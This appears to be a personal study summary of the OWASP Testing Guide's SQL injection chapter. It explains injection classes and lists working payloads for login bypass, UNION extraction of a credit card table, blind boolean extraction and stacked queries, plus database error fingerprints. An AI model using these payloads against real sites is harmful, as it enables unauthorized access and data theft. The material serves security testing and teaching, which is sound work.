Kennedy Sanchez <ksanchez@cldeveloper.com>
--------------------------------------------------------------------------------
This article is part of the new OWASP Testing Guide v4.

https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29
https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
https://www.owasp.org/index.php/OWASP_Testing_Project
---------------------------------------------------------------------------------

An SQL injection attack consists of insertion or "injection" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands. 

SQL Injection attacks can be divided into the following three classes: 

    Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.

    Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).

    Inferential or Blind: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.

A successful SQL Injection attack requires the attacker to craft a syntactically correct SQL Query. If the application returns an error message generated by an incorrect query, then it may be easier for an attacker to reconstruct the logic of the original query and, therefore, understand how to perform the injection correctly. However, if the application hides the error details, then the tester must be able to reverse engineer the logic of the original query. 

Techniques to exploit SQL injection flaws there are five commons techniques. Also those techniques sometimes can be used in a combined way (e.g. union operator and out-of-band):

    Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.

    Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.

    Error based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.

    Out-of-band: technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).

    Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.

    Authentication forms: when authentication is performed using a web form, chances are that the user credentials are checked against a database that contains all usernames and passwords (or, better, password hashes).

    Search engines: the string submitted by the user could be used in a SQL query that extracts all relevant records from a database.

    E-Commerce sites: the products and their characteristics (price, description, availability, etc) are very likely to be stored in a database.

The very first test usually consists of adding a single quote (') or a semicolon (;) to the field or parameter under test. The first is used in SQL as a string terminator and, if not filtered by the application, would lead to an incorrect query. The second is used to end a SQL statement and, if it is not filtered, it is also likely to generate an error.

SINTAX 
 - select title, text from news where id=$id
 - select title, text from news where id=10 or 1=1


====================================
Example 1 (classical SQL Injection)
====================================

SELECT * FROM Users WHERE Username='$username' AND Password='$password'
	- $username = 1' or '1' = '1
	- $password = 1' or '1' = '1
	- SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1' 
	- http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&password=1'%20or%20'1'%20=%20'1 

====================================
Example 2 (classical SQL Injection)
====================================
SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))
	- $username = 1' or '1' = '1'))/*
	- $password = foo
	- SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password'))) 
	- http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&password=foo

====================================
Example 4 (classical SQL Injection)
====================================
SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))
	- $username = 1' or '1' = '1')) LIMIT 1/* 
	- $password = foo 
	- http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&password=foo 

====================================
Example 5  (simple SELECT statement)
====================================
SELECT * FROM products WHERE id_product=$id_product | http://www.example.com/product.php?id=10
	- http://www.example.com/product.php?id=10 AND 1=2
	- SELECT * FROM products WHERE id_product=10 AND 1=2
	- http://www.example.com/product.php?id=10 AND 1=1


====================================
Example 6 (Stacked queries)
====================================
SELECT * FROM products WHERE id_product=$id_product
	- http://www.example.com/product.php?id=10; INSERT INTO users (…)



[Fingerprinting the Database]

every DBMS has its peculiarity and differs from each other in many aspects like special commands, functions to retrieve data such as users names and databases, features, comments line etc. 

1) The first way to find out what back end database is used is by observing the error returned by the application.

[OUTPUTS]

***MySql***

You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1


**Microsoft SQL Server**

Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the 
character string ''.
/target/target.asp, line 113


**Microsoft SQL Server**

Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string


***Oracle***

ORA-00933: SQL command not properly ended


***PostgreSQL***

Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.


2) If there is no error message or a custom error message, the tester can try to inject into string field using concatenation technique:


MySql: ‘test’ + ‘ing’

SQL Server: ‘test’ ‘ing’

Oracle: ‘test’||’ing’

PostgreSQL: ‘test’||’ing’ 


===========================
Exploitation Techniques
===========================

[Union Exploitation Technique]

The UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query. The result of the forged query will be joined to the result of the original query, allowing the tester to obtain the values of columns of other tables. 

SELECT Name, Phone, Address FROM Users WHERE Id=$id 
	- $id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable 
	- SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable


	- http://www.example.com/product.php?id=10 ORDER BY 10--

	- http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--

	- http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--

	- http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--


[Boolean Exploitation Technique]

The Boolean exploitation technique is very useful when the tester finds a Blind SQL Injection situation, in which nothing is known on the outcome of an operation.

SELECT field1, field2, field3 FROM Users WHERE Id='$Id' 
	- http://www.example.com/index.php?id=1'
	- $Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1 
	- SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'
	- $Id=1' AND '1' = '2 
	- SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2' 
	- $Id=1' AND LENGTH(username)=N AND '1' = '1 
	- SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1' 


[Error based Exploitation technique]



Video Samples

 - https://www.youtube.com/watch?v=4LM_EIehbsU